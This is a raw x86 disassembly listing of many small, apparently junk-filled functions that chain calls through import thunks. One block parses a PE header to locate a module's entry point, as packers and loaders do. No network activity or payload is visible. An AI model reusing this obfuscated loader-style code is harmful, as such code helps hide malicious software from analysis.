  4d078a:	call   0x4d12d0
  4d078f:	add    esp,0x4
  4d0792:	pop    eax
  4d0793:	push   eax
  4d0794:	push   ebx
  4d0795:	push   DWORD PTR [eax+0x1e4]
  4d079b:	call   0x4d1164
  4d07a0:	add    esp,0x8
  4d07a3:	pop    eax
  4d07a4:	push   eax
  4d07a5:	call   0x4d08b8
  4d07aa:	add    esp,0x4
  4d07ad:	pop    eax
  4d07ae:	add    esp,0x44
  4d07b1:	pop    ebp
  4d07b2:	ret    
  4d07b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b9:	sub    esp,0x44
  4d07bc:	mov    ecx,0x4d3130
  4d07c1:	mov    DWORD PTR [ecx-0xf8],eax
  4d07c7:	push   ecx
  4d07c8:	push   DWORD PTR [ecx+0x10c]
  4d07ce:	push   DWORD PTR [ecx+0x1dc]
  4d07d4:	push   DWORD PTR [ecx+0xc]
  4d07d7:	call   0x4d0da0
  4d07dc:	add    esp,0xc
  4d07df:	pop    ecx
  4d07e0:	push   ecx
  4d07e1:	push   0xfffffff4
  4d07e3:	call   0x4d085c
  4d07e8:	add    esp,0x4
  4d07eb:	pop    ecx
  4d07ec:	mov    edx,0x4d2040
  4d07f1:	mov    edx,DWORD PTR [edx]
  4d07f3:	push   edx
  4d07f4:	push   DWORD PTR [ecx-0x10]
  4d07f7:	pop    esi
  4d07f8:	call   esi
  4d07fa:	add    esp,0x44
  4d07fd:	pop    ebp
  4d07fe:	ret    
  4d07ff:	add    BYTE PTR [edi-0x1],bl
  4d0802:	adc    eax,0x4d2008
  4d0807:	call   edi
  4d0809:	add    BYTE PTR [eax],al
  4d080b:	add    BYTE PTR [edi-0x1],bl
  4d080e:	adc    eax,0x4d2084
  4d0813:	call   edi
  4d0815:	add    BYTE PTR [eax],al
  4d0817:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d081d:	sub    esp,0x30
  4d0820:	lea    esi,ds:0x4d3054
  4d0826:	add    DWORD PTR [esi+0xb0],0xffffff99
  4d082d:	push   esi
  4d082e:	push   edi
  4d082f:	push   DWORD PTR [esi+0xf0]
  4d0835:	call   0x4d1558
  4d083a:	add    esp,0x8
  4d083d:	pop    esi
  4d083e:	call   0x4d12d0
  4d0843:	add    esp,0x4
  4d0846:	mov    ebx,0x0
  4d084b:	push   ebx
  4d084c:	call   0x4d1114
  4d0851:	add    esp,0x4
  4d0854:	add    esp,0x30
  4d0857:	pop    ebp
  4d0858:	ret    
  4d0859:	add    BYTE PTR [eax],al
  4d085b:	add    BYTE PTR [edi-0x1],bl
  4d085e:	adc    eax,0x4d2030
  4d0863:	call   edi
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [edi-0x1],bl
  4d086a:	adc    eax,0x4d2014
  4d086f:	call   edi
  4d0871:	add    BYTE PTR [eax],al
  4d0873:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0879:	sub    esp,0x60
  4d087c:	lea    esi,[edi+0x5c]
  4d087f:	or     DWORD PTR [ebp-0x10],0x75eb
  4d0886:	push   0x0
  4d0888:	call   0x4d104c
  4d088d:	add    esp,0x4
  4d0890:	push   esi
  4d0891:	push   ebx
  4d0892:	push   DWORD PTR [esi+0xe8]
  4d0898:	push   DWORD PTR [esi+0x174]
  4d089e:	push   edx
  4d089f:	call   0x4d0a84
  4d08a4:	add    esp,0x10
  4d08a7:	pop    esi
  4d08a8:	push   0x0
  4d08aa:	call   0x4d13d0
  4d08af:	add    esp,0x4
  4d08b2:	add    esp,0x60
  4d08b5:	pop    ebp
  4d08b6:	ret    
  4d08b7:	add    BYTE PTR [edi-0x1],bl
  4d08ba:	adc    eax,0x4d204c
  4d08bf:	call   edi
  4d08c1:	add    BYTE PTR [eax],al
  4d08c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08c9:	sub    esp,0x48
  4d08cc:	lea    eax,[edx+0x1c8]
  4d08d2:	adc    edx,DWORD PTR [ebp-0xc]
  4d08d5:	push   eax
  4d08d6:	call   0x4d08b8
  4d08db:	add    esp,0x4
  4d08de:	pop    eax
  4d08df:	push   eax
  4d08e0:	push   DWORD PTR [eax+0x1bc]
  4d08e6:	push   DWORD PTR [eax+0x164]
  4d08ec:	call   0x4d0ed8
  4d08f1:	add    esp,0x8
  4d08f4:	pop    eax
  4d08f5:	push   eax
  4d08f6:	push   0x0
  4d08f8:	call   0x4d1114
  4d08fd:	add    esp,0x4
  4d0900:	pop    eax
  4d0901:	add    esp,0x48
  4d0904:	pop    ebp
  4d0905:	ret    
  4d0906:	add    BYTE PTR [eax],al
  4d0908:	pop    edi
  4d0909:	call   DWORD PTR ds:0x4d207c
  4d090f:	call   edi
  4d0911:	add    BYTE PTR [eax],al
  4d0913:	add    BYTE PTR [edi-0x1],bl
  4d0916:	adc    eax,0x4d202c
  4d091b:	call   edi
  4d091d:	add    BYTE PTR [eax],al
  4d091f:	add    BYTE PTR [edi-0x1],bl
  4d0922:	adc    eax,0x4d2070
  4d0927:	call   edi
  4d0929:	add    BYTE PTR [eax],al
  4d092b:	add    BYTE PTR [edi-0x1],bl
  4d092e:	adc    eax,0x4d200c
  4d0933:	call   edi
  4d0935:	add    BYTE PTR [eax],al
  4d0937:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d093d:	sub    esp,0x44
  4d0940:	mov    ecx,0x4d31d0
  4d0945:	or     DWORD PTR [ebp-0x40],0xffffffbb
  4d0949:	push   ecx
  4d094a:	lea    eax,[ecx-0x1d0]
  4d0950:	push   eax
  4d0951:	call   0x4d15a0
  4d0956:	add    esp,0x4
  4d0959:	test   eax,eax
  4d095b:	jne    0x4d094a
  4d095d:	pop    ecx
  4d095e:	push   ecx
  4d095f:	push   ebx
  4d0960:	push   esi
  4d0961:	push   DWORD PTR [ecx+0x124]
  4d0967:	push   DWORD PTR [ecx+0x1c8]
  4d096d:	call   0x4d0d48
  4d0972:	add    esp,0x10
  4d0975:	pop    ecx
  4d0976:	push   ecx
  4d0977:	mov    eax,0x0
  4d097c:	push   eax
  4d097d:	call   0x4d0ca4
  4d0982:	add    esp,0x4
  4d0985:	pop    ecx
  4d0986:	add    esp,0x44
  4d0989:	pop    ebp
  4d098a:	ret    
  4d098b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0991:	sub    esp,0x5c
  4d0994:	lea    ecx,ds:0x4d3174
  4d099a:	sub    edx,DWORD PTR [ecx-0x11c]
  4d09a0:	push   ecx
  4d09a1:	mov    esi,0x0
  4d09a6:	push   esi
  4d09a7:	call   0x4d092c
  4d09ac:	add    esp,0x4
  4d09af:	pop    ecx
  4d09b0:	push   ecx
  4d09b1:	push   DWORD PTR [ecx+0x118]
  4d09b7:	push   DWORD PTR [ecx+0x14c]
  4d09bd:	push   ebx
  4d09be:	push   edi
  4d09bf:	call   0x4d13dc
  4d09c4:	add    esp,0x10
  4d09c7:	pop    ecx
  4d09c8:	push   ecx
  4d09c9:	mov    edi,0x0
  4d09ce:	push   edi
  4d09cf:	call   0x4d092c
  4d09d4:	add    esp,0x4
  4d09d7:	pop    ecx
  4d09d8:	add    esp,0x5c
  4d09db:	pop    ebp
  4d09dc:	ret    
  4d09dd:	add    BYTE PTR [eax],al
  4d09df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09e5:	sub    esp,0x44
  4d09e8:	lea    edi,[ebx-0x74]
  4d09eb:	and    DWORD PTR [edi+0x70],0xffffffa0
  4d09ef:	push   edi
  4d09f0:	call   0x4d12d0
  4d09f5:	add    esp,0x4
  4d09f8:	pop    edi
  4d09f9:	push   edi
  4d09fa:	push   edx
  4d09fb:	push   DWORD PTR [edi+0x20]
  4d09fe:	push   DWORD PTR [edi+0x17c]
  4d0a04:	call   0x4d1378
  4d0a09:	add    esp,0xc
  4d0a0c:	pop    edi
  4d0a0d:	push   edi
  4d0a0e:	push   0x0
  4d0a10:	call   0x4d0a20
  4d0a15:	add    esp,0x4
  4d0a18:	pop    edi
  4d0a19:	add    esp,0x44
  4d0a1c:	pop    ebp
  4d0a1d:	ret    
  4d0a1e:	add    BYTE PTR [eax],al
  4d0a20:	pop    edi
  4d0a21:	call   DWORD PTR ds:0x4d2078
  4d0a27:	call   edi
  4d0a29:	add    BYTE PTR [eax],al
  4d0a2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a31:	sub    esp,0x24
  4d0a34:	lea    esi,ds:0x4d30e4
  4d0a3a:	cmp    esi,0x4c82
  4d0a40:	jbe    0x4d0a2f
  4d0a42:	push   esi
  4d0a43:	push   eax
  4d0a44:	push   DWORD PTR [esi+0x140]
  4d0a4a:	push   DWORD PTR [esi+0x184]
  4d0a50:	push   eax
  4d0a51:	call   0x4d0e84
  4d0a56:	add    esp,0x10
  4d0a59:	pop    esi
  4d0a5a:	push   0x0
  4d0a5c:	call   0x4d1114
  4d0a61:	add    esp,0x4
  4d0a64:	mov    eax,0xfffffff4
  4d0a69:	push   eax
  4d0a6a:	call   0x4d085c
  4d0a6f:	add    esp,0x4
  4d0a72:	add    esp,0x24
  4d0a75:	pop    ebp
  4d0a76:	ret    
  4d0a77:	add    BYTE PTR [edi-0x1],bl
  4d0a7a:	adc    eax,0x4d2090
  4d0a7f:	call   edi
  4d0a81:	add    BYTE PTR [eax],al
  4d0a83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a89:	sub    esp,0x54
  4d0a8c:	mov    eax,0x4d3134
  4d0a91:	adc    esi,DWORD PTR [ebp-0x2c]
  4d0a94:	push   eax
  4d0a95:	push   0x0
  4d0a97:	call   0x4d092c
  4d0a9c:	add    esp,0x4
  4d0a9f:	pop    eax
  4d0aa0:	push   eax
  4d0aa1:	push   edx
  4d0aa2:	push   ebx
  4d0aa3:	push   edx
  4d0aa4:	call   0x4d1238
  4d0aa9:	add    esp,0xc
  4d0aac:	pop    eax
  4d0aad:	push   eax
  4d0aae:	mov    ecx,0x0
  4d0ab3:	push   ecx
  4d0ab4:	call   0x4d1220
  4d0ab9:	add    esp,0x4
  4d0abc:	pop    eax
  4d0abd:	add    esp,0x54
  4d0ac0:	pop    ebp
  4d0ac1:	ret    
  4d0ac2:	add    BYTE PTR [eax],al
  4d0ac4:	mov    edi,edi
  4d0ac6:	push   ebp
  4d0ac7:	mov    ebp,esp
  4d0ac9:	sub    esp,0x58
  4d0acc:	mov    edi,0x4d30b0
  4d0ad1:	add    DWORD PTR [ebp-0x30],0x72d9
  4d0ad8:	push   edi
  4d0ad9:	push   esi
  4d0ada:	push   DWORD PTR [edi+0x19c]
  4d0ae0:	call   0x4d06ec
  4d0ae5:	add    esp,0x8
  4d0ae8:	pop    edi
  4d0ae9:	push   edi
  4d0aea:	push   0x0
  4d0aec:	call   0x4d104c
  4d0af1:	add    esp,0x4
  4d0af4:	pop    edi
  4d0af5:	push   edi
  4d0af6:	mov    ecx,0x0
  4d0afb:	push   ecx
  4d0afc:	call   0x4d0d94
  4d0b01:	add    esp,0x4
  4d0b04:	pop    edi
  4d0b05:	add    esp,0x58
  4d0b08:	pop    ebp
  4d0b09:	ret    
  4d0b0a:	add    BYTE PTR [eax],al
  4d0b0c:	pop    edi
  4d0b0d:	call   DWORD PTR ds:0x4d2034
  4d0b13:	call   edi
  4d0b15:	add    BYTE PTR [eax],al
  4d0b17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b1d:	sub    esp,0x50
  4d0b20:	lea    esi,[edx-0x114]
  4d0b26:	or     DWORD PTR [esi+0x14],0x375
  4d0b2d:	push   esi
  4d0b2e:	push   DWORD PTR [esi+0x90]
  4d0b34:	push   DWORD PTR [esi+0x30]
  4d0b37:	push   edi
  4d0b38:	push   DWORD PTR [esi+0x1b4]
  4d0b3e:	call   0x4d0ac4
  4d0b43:	add    esp,0x10
  4d0b46:	pop    esi
  4d0b47:	mov    edx,0x0
  4d0b4c:	push   edx
  4d0b4d:	call   0x4d092c
  4d0b52:	add    esp,0x4
  4d0b55:	lea    edx,[esi-0x5c]
  4d0b58:	push   edx
  4d0b59:	call   0x4d15a0
  4d0b5e:	add    esp,0x4
  4d0b61:	test   eax,eax
  4d0b63:	jne    0x4d0b56
  4d0b65:	add    esp,0x50
  4d0b68:	pop    ebp
  4d0b69:	ret    
  4d0b6a:	add    BYTE PTR [eax],al
  4d0b6c:	pop    edi
  4d0b6d:	call   DWORD PTR ds:0x4d2020
  4d0b73:	call   edi
  4d0b75:	add    BYTE PTR [eax],al
  4d0b77:	add    BYTE PTR [edi-0x1],bl
  4d0b7a:	adc    eax,0x4d2044
  4d0b7f:	call   edi
  4d0b81:	add    BYTE PTR [eax],al
  4d0b83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b89:	sub    esp,0x48
  4d0b8c:	lea    eax,[edx-0xe8]
  4d0b92:	sub    ecx,DWORD PTR [eax+0x154]
  4d0b98:	push   eax
  4d0b99:	push   edx
  4d0b9a:	push   DWORD PTR [eax+0xa0]
  4d0ba0:	push   edx
  4d0ba1:	push   esi
  4d0ba2:	call   0x4d098c
  4d0ba7:	add    esp,0x10
  4d0baa:	pop    eax
  4d0bab:	push   eax
  4d0bac:	mov    edx,0x0
  4d0bb1:	push   edx
  4d0bb2:	call   0x4d0a20
  4d0bb7:	add    esp,0x4
  4d0bba:	pop    eax
  4d0bbb:	push   eax
  4d0bbc:	push   0x0
  4d0bbe:	call   0x4d1114
  4d0bc3:	add    esp,0x4
  4d0bc6:	pop    eax
  4d0bc7:	add    esp,0x48
  4d0bca:	pop    ebp
  4d0bcb:	ret    
  4d0bcc:	mov    edi,edi
  4d0bce:	push   ebp
  4d0bcf:	mov    ebp,esp
  4d0bd1:	sub    esp,0x3c
  4d0bd4:	lea    esi,ds:0x4d31d8
  4d0bda:	adc    edi,DWORD PTR [esi-0x48]
  4d0bdd:	mov    ecx,0x0
  4d0be2:	push   ecx
  4d0be3:	call   0x4d1114
  4d0be8:	add    esp,0x4
  4d0beb:	push   esi
  4d0bec:	push   DWORD PTR [esi+0x170]
  4d0bf2:	push   DWORD PTR [esi+0x28]
  4d0bf5:	call   0x4d15ac
  4d0bfa:	add    esp,0x8
  4d0bfd:	pop    esi
  4d0bfe:	mov    edx,0x0
  4d0c03:	push   edx
  4d0c04:	call   0x4d092c
  4d0c09:	add    esp,0x4
  4d0c0c:	add    esp,0x3c
  4d0c0f:	pop    ebp
  4d0c10:	ret    
  4d0c11:	add    BYTE PTR [eax],al
  4d0c13:	add    BYTE PTR [edi+0x2b],dl
  4d0c16:	call   DWORD PTR [edi+0x57]
  4d0c19:	push   edi
  4d0c1a:	push   edi
  4d0c1b:	call   0x4d0f1c
  4d0c20:	sub    esp,0xfffffffc
  4d0c23:	call   0x4d0868
  4d0c28:	push   0x2
  4d0c2a:	xor    eax,eax
  4d0c2c:	adc    eax,0x4d3030
  4d0c31:	push   0x0
  4d0c33:	xor    ecx,ecx
  4d0c35:	adc    ecx,0x4d3036
  4d0c3b:	add    BYTE PTR [ecx],0x41
  4d0c3e:	push   eax
  4d0c3f:	call   0x4d0914
  4d0c44:	pop    edi
  4d0c45:	pop    edi
  4d0c46:	pop    edi
  4d0c47:	lea    edi,[eax+0x3b]
  4d0c4a:	mov    edi,DWORD PTR [edi]
  4d0c4c:	lea    eax,[eax+edi*1]
  4d0c4f:	mov    eax,DWORD PTR [eax+0x28]
  4d0c52:	pusha  
  4d0c53:	mov    ah,0x45
  4d0c55:	sub    al,ah
  4d0c57:	ja     0x4d07b4
  4d0c5d:	popa   
  4d0c5e:	ret    
  4d0c5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c65:	sub    esp,0x38
  4d0c68:	lea    eax,[esi-0x140]
  4d0c6e:	add    DWORD PTR [eax+0x40],edi
  4d0c71:	push   eax
  4d0c72:	push   edi
  4d0c73:	push   edi
  4d0c74:	push   edi
  4d0c75:	call   0x4d1338
  4d0c7a:	add    esp,0xc
  4d0c7d:	pop    eax
  4d0c7e:	push   eax
  4d0c7f:	mov    eax,0x0
  4d0c84:	push   eax
  4d0c85:	call   0x4d0b78
  4d0c8a:	add    esp,0x4
  4d0c8d:	pop    eax
  4d0c8e:	push   eax
  4d0c8f:	mov    edx,0x0
  4d0c94:	push   edx
  4d0c95:	call   0x4d1220
  4d0c9a:	add    esp,0x4
  4d0c9d:	pop    eax
  4d0c9e:	add    esp,0x38
  4d0ca1:	pop    ebp
  4d0ca2:	ret    
  4d0ca3:	add    BYTE PTR [edi-0x1],bl
  4d0ca6:	adc    eax,0x4d2068
  4d0cab:	call   edi
  4d0cad:	add    BYTE PTR [eax],al
  4d0caf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cb5:	sub    esp,0x54
  4d0cb8:	mov    edi,0x4d3038
  4d0cbd:	and    DWORD PTR [edi+0x78],eax
  4d0cc0:	push   edi
  4d0cc1:	push   esi
  4d0cc2:	push   DWORD PTR [edi+0x1b8]
  4d0cc8:	call   0x4d0874
  4d0ccd:	add    esp,0x8
  4d0cd0:	pop    edi
  4d0cd1:	push   edi
  4d0cd2:	push   0x0
  4d0cd4:	call   0x4d13d0
  4d0cd9:	add    esp,0x4
  4d0cdc:	pop    edi
  4d0cdd:	push   edi
  4d0cde:	mov    ecx,0x0
  4d0ce3:	push   ecx
  4d0ce4:	call   0x4d0ca4
  4d0ce9:	add    esp,0x4
  4d0cec:	pop    edi
  4d0ced:	add    esp,0x54
  4d0cf0:	pop    ebp
  4d0cf1:	ret    
  4d0cf2:	add    BYTE PTR [eax],al
  4d0cf4:	mov    edi,edi
  4d0cf6:	push   ebp
  4d0cf7:	mov    ebp,esp
  4d0cf9:	sub    esp,0x20
  4d0cfc:	lea    edx,ds:0x4d30f0
  4d0d02:	and    edi,0xfffffff2
  4d0d05:	push   edx
  4d0d06:	push   0x0
  4d0d08:	call   0x4d092c
  4d0d0d:	add    esp,0x4
  4d0d10:	pop    edx
  4d0d11:	push   edx
  4d0d12:	push   DWORD PTR [edx+0xcc]
  4d0d18:	push   DWORD PTR [edx+0x108]
  4d0d1e:	push   DWORD PTR [edx+0x18c]
  4d0d24:	push   DWORD PTR [edx+0xd8]
  4d0d2a:	call   0x4d0b84
  4d0d2f:	add    esp,0x10
  4d0d32:	pop    edx
  4d0d33:	push   edx
  4d0d34:	mov    ebx,0x0
  4d0d39:	push   ebx
  4d0d3a:	call   0x4d1114
  4d0d3f:	add    esp,0x4
  4d0d42:	pop    edx
  4d0d43:	add    esp,0x20
  4d0d46:	pop    ebp
  4d0d47:	ret    
  4d0d48:	mov    edi,edi
  4d0d4a:	push   ebp
  4d0d4b:	mov    ebp,esp
  4d0d4d:	sub    esp,0x5c
  4d0d50:	lea    edi,ds:0x4d3034
  4d0d56:	and    ecx,DWORD PTR [edi+0x11c]
  4d0d5c:	push   edi
  4d0d5d:	mov    edi,0x0
  4d0d62:	push   edi
  4d0d63:	call   0x4d0d94
  4d0d68:	add    esp,0x4
  4d0d6b:	pop    edi
  4d0d6c:	push   edi
  4d0d6d:	push   DWORD PTR [edi+0x24]
  4d0d70:	push   DWORD PTR [edi+0x150]
  4d0d76:	call   0x4d0cf4
  4d0d7b:	add    esp,0x8
  4d0d7e:	pop    edi
  4d0d7f:	push   edi
  4d0d80:	mov    eax,0x0
  4d0d85:	push   eax
  4d0d86:	call   0x4d0b78
  4d0d8b:	add    esp,0x4
  4d0d8e:	pop    edi
  4d0d8f:	add    esp,0x5c
  4d0d92:	pop    ebp
  4d0d93:	ret    
  4d0d94:	pop    edi
  4d0d95:	call   DWORD PTR ds:0x4d2004
  4d0d9b:	call   edi
  4d0d9d:	add    BYTE PTR [eax],al
  4d0d9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0da5:	sub    esp,0x30
  4d0da8:	mov    eax,0x4d3018
  4d0dad:	or     edx,0xffffffb5
  4d0db0:	push   eax
  4d0db1:	mov    esi,0x0
  4d0db6:	push   esi
  4d0db7:	call   0x4d0ca4
  4d0dbc:	add    esp,0x4
  4d0dbf:	pop    eax
  4d0dc0:	push   eax
  4d0dc1:	push   DWORD PTR [eax+0x1d4]
  4d0dc7:	push   DWORD PTR [eax+0x170]
  4d0dcd:	call   0x4d150c
  4d0dd2:	add    esp,0x8
  4d0dd5:	pop    eax
  4d0dd6:	push   eax
  4d0dd7:	push   0x0
  4d0dd9:	call   0x4d0ca4
  4d0dde:	add    esp,0x4
  4d0de1:	pop    eax
  4d0de2:	add    esp,0x30
  4d0de5:	pop    ebp
  4d0de6:	ret    
  4d0de7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ded:	sub    esp,0x44
  4d0df0:	lea    edi,[ebx-0x38]
  4d0df3:	adc    eax,DWORD PTR [ebp-0x38]
  4d0df6:	push   edi
  4d0df7:	call   0x4d08b8
  4d0dfc:	add    esp,0x4
  4d0dff:	pop    edi
  4d0e00:	push   edi
  4d0e01:	push   DWORD PTR [edi+0x1e4]
  4d0e07:	push   DWORD PTR [edi+0x180]
  4d0e0d:	push   ebx
  4d0e0e:	push   DWORD PTR [edi+0x10c]
  4d0e14:	call   0x4d0f70
  4d0e19:	add    esp,0x10
  4d0e1c:	pop    edi
  4d0e1d:	push   edi
  4d0e1e:	mov    ecx,0x0
  4d0e23:	push   ecx
  4d0e24:	call   0x4d0a20
  4d0e29:	add    esp,0x4
  4d0e2c:	pop    edi
  4d0e2d:	add    esp,0x44
  4d0e30:	pop    ebp
  4d0e31:	ret    
  4d0e32:	add    BYTE PTR [eax],al
  4d0e34:	mov    edi,edi
  4d0e36:	push   ebp
  4d0e37:	mov    ebp,esp
  4d0e39:	sub    esp,0x44
  4d0e3c:	lea    ebx,ds:0x4d3090
  4d0e42:	cmp    ebx,0x3d47
  4d0e48:	jb     0x4d0e37
  4d0e4a:	mov    edi,0x0
  4d0e4f:	push   edi
  4d0e50:	call   0x4d13d0
  4d0e55:	add    esp,0x4
  4d0e58:	push   ebx
  4d0e59:	push   DWORD PTR [ebx+0x1a0]
  4d0e5f:	push   DWORD PTR [ebx+0xec]
  4d0e65:	push   edi
  4d0e66:	push   DWORD PTR [ebx+0x1bc]
  4d0e6c:	call   0x4d10c4
  4d0e71:	add    esp,0x10
  4d0e74:	pop    ebx
  4d0e75:	push   0x0
  4d0e77:	call   0x4d0ca4
  4d0e7c:	add    esp,0x4
  4d0e7f:	add    esp,0x44
  4d0e82:	pop    ebp
  4d0e83:	ret    
  4d0e84:	mov    edi,edi
  4d0e86:	push   ebp
  4d0e87:	mov    ebp,esp
  4d0e89:	sub    esp,0x50
  4d0e8c:	lea    edx,[esi-0xe4]
  4d0e92:	xor    DWORD PTR [ebp-0x14],0x700f
  4d0e99:	push   edx
  4d0e9a:	push   DWORD PTR [edx+0x40]
  4d0e9d:	push   eax
  4d0e9e:	push   edi
  4d0e9f:	push   DWORD PTR [edx+0x68]
  4d0ea2:	call   0x4d08c4
  4d0ea7:	add    esp,0x10
  4d0eaa:	pop    edx
  4d0eab:	push   edx
  4d0eac:	push   0x0
  4d0eae:	call   0x4d104c
  4d0eb3:	add    esp,0x4
  4d0eb6:	pop    edx
  4d0eb7:	push   edx
  4d0eb8:	mov    ecx,0x0
  4d0ebd:	push   ecx
  4d0ebe:	call   0x4d0ca4
  4d0ec3:	add    esp,0x4
  4d0ec6:	pop    edx
  4d0ec7:	add    esp,0x50
  4d0eca:	pop    ebp
  4d0ecb:	ret    
  4d0ecc:	pop    edi
  4d0ecd:	call   DWORD PTR ds:0x4d2054
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x50
  4d0ee0:	lea    ebx,[eax-0x30]
  4d0ee3:	and    DWORD PTR [ebp-0x44],ecx
  4d0ee6:	mov    edx,0xfffffff4
  4d0eeb:	push   edx
  4d0eec:	call   0x4d085c
  4d0ef1:	add    esp,0x4
  4d0ef4:	push   ebx
  4d0ef5:	push   DWORD PTR [ebx+0x1f4]
  4d0efb:	push   DWORD PTR [ebx+0x4c]
  4d0efe:	push   esi
  4d0eff:	call   0x4d1064
  4d0f04:	add    esp,0xc
  4d0f07:	pop    ebx
  4d0f08:	mov    ecx,0x0
  4d0f0d:	push   ecx
  4d0f0e:	call   0x4d13d0
  4d0f13:	add    esp,0x4
  4d0f16:	add    esp,0x50
  4d0f19:	pop    ebp
  4d0f1a:	ret    
  4d0f1b:	add    BYTE PTR [edi-0x1],bl
  4d0f1e:	adc    eax,0x4d2018
  4d0f23:	call   edi
  4d0f25:	add    BYTE PTR [eax],al
  4d0f27:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f2d:	sub    esp,0x60
  4d0f30:	lea    edx,ds:0x4d31b0
  4d0f36:	adc    edi,DWORD PTR [ebp-0x28]
  4d0f39:	push   edx
  4d0f3a:	push   ebx
  4d0f3b:	push   DWORD PTR [edx+0x17c]
  4d0f41:	push   DWORD PTR [edx+0xfc]
  4d0f47:	call   0x4d0cb0
  4d0f4c:	add    esp,0xc
  4d0f4f:	pop    edx
  4d0f50:	push   edx
  4d0f51:	push   0x0
  4d0f53:	call   0x4d0ca4
  4d0f58:	add    esp,0x4
  4d0f5b:	pop    edx
  4d0f5c:	push   edx
  4d0f5d:	push   0x0
  4d0f5f:	call   0x4d13d0
  4d0f64:	add    esp,0x4
  4d0f67:	pop    edx
  4d0f68:	add    esp,0x60
  4d0f6b:	pop    ebp
  4d0f6c:	ret    
  4d0f6d:	add    BYTE PTR [eax],al
  4d0f6f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f75:	sub    esp,0x60
  4d0f78:	mov    eax,0x4d3050
  4d0f7d:	mov    DWORD PTR [eax+0x184],0xffffdfd6
  4d0f87:	push   eax
  4d0f88:	push   ebx
  4d0f89:	push   DWORD PTR [eax+0x148]
  4d0f8f:	call   0x4d0e34
  4d0f94:	add    esp,0x8
  4d0f97:	pop    eax
  4d0f98:	push   eax
  4d0f99:	push   0x0
  4d0f9b:	call   0x4d1220
  4d0fa0:	add    esp,0x4
  4d0fa3:	pop    eax
  4d0fa4:	push   eax
  4d0fa5:	mov    edi,0x0
  4d0faa:	push   edi
  4d0fab:	call   0x4d0a20
  4d0fb0:	add    esp,0x4
  4d0fb3:	pop    eax
  4d0fb4:	add    esp,0x60
  4d0fb7:	pop    ebp
  4d0fb8:	ret    
  4d0fb9:	add    BYTE PTR [eax],al
  4d0fbb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fc1:	sub    esp,0x40
  4d0fc4:	lea    ecx,ds:0x4d3000
  4d0fca:	add    DWORD PTR [ebp-0x1c],edx
  4d0fcd:	push   ecx
  4d0fce:	mov    ecx,0x0
  4d0fd3:	push   ecx
  4d0fd4:	call   0x4d104c
  4d0fd9:	add    esp,0x4
  4d0fdc:	pop    ecx
  4d0fdd:	push   ecx
  4d0fde:	push   edi
  4d0fdf:	push   esi
  4d0fe0:	push   ebx
  4d0fe1:	call   0x4d147c
  4d0fe6:	add    esp,0xc
  4d0fe9:	pop    ecx
  4d0fea:	push   ecx
  4d0feb:	call   0x4d0f1c
  4d0ff0:	add    esp,0x4
  4d0ff3:	pop    ecx
  4d0ff4:	add    esp,0x40
  4d0ff7:	pop    ebp
  4d0ff8:	ret    
  4d0ff9:	add    BYTE PTR [eax],al
  4d0ffb:	add    BYTE PTR [edi-0x1],bl
  4d0ffe:	adc    eax,0x4d20a0
  4d1003:	call   edi
  4d1005:	add    BYTE PTR [eax],al
  4d1007:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d100d:	sub    esp,0x4c
  4d1010:	lea    edi,[edx+0x138]
  4d1016:	xor    edx,edi
  4d1018:	push   edi
  4d1019:	push   esi
  4d101a:	push   DWORD PTR [edi+0x90]
  4d1020:	push   DWORD PTR [edi+0x158]
  4d1026:	call   0x4d12dc
  4d102b:	add    esp,0xc
  4d102e:	pop    edi
  4d102f:	push   edi
  4d1030:	push   0x0
  4d1032:	call   0x4d1220
  4d1037:	add    esp,0x4
  4d103a:	pop    edi
  4d103b:	push   edi
  4d103c:	push   0x0
  4d103e:	call   0x4d0ca4
  4d1043:	add    esp,0x4
  4d1046:	pop    edi
  4d1047:	add    esp,0x4c
  4d104a:	pop    ebp
  4d104b:	ret    
  4d104c:	pop    edi
  4d104d:	call   DWORD PTR ds:0x4d2028
  4d1053:	call   edi
  4d1055:	add    BYTE PTR [eax],al
  4d1057:	add    BYTE PTR [edi-0x1],bl
  4d105a:	adc    eax,0x4d2024
  4d105f:	call   edi
  4d1061:	add    BYTE PTR [eax],al
  4d1063:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1069:	sub    esp,0x5c
  4d106c:	lea    eax,ds:0x4d31b4
  4d1072:	add    DWORD PTR [ebp-0x4c],ecx
  4d1075:	push   eax
  4d1076:	push   DWORD PTR [eax+0x6c]
  4d1079:	push   edi
  4d107a:	push   esi
  4d107b:	push   DWORD PTR [eax+0x144]
  4d1081:	call   0x4d0f28
  4d1086:	add    esp,0x10
  4d1089:	pop    eax
  4d108a:	push   eax
  4d108b:	mov    ecx,0x0
  4d1090:	push   ecx
  4d1091:	call   0x4d1114
  4d1096:	add    esp,0x4
  4d1099:	pop    eax
  4d109a:	push   eax
  4d109b:	call   0x4d12d0
  4d10a0:	add    esp,0x4
  4d10a3:	pop    eax
  4d10a4:	add    esp,0x5c
  4d10a7:	pop    ebp
  4d10a8:	ret    
  4d10a9:	add    BYTE PTR [eax],al
  4d10ab:	add    BYTE PTR [edi-0x1],bl
  4d10ae:	adc    eax,0x4d2074
  4d10b3:	call   edi
  4d10b5:	add    BYTE PTR [eax],al
  4d10b7:	add    BYTE PTR [edi-0x1],bl
  4d10ba:	adc    eax,0x4d2098
  4d10bf:	call   edi
  4d10c1:	add    BYTE PTR [eax],al
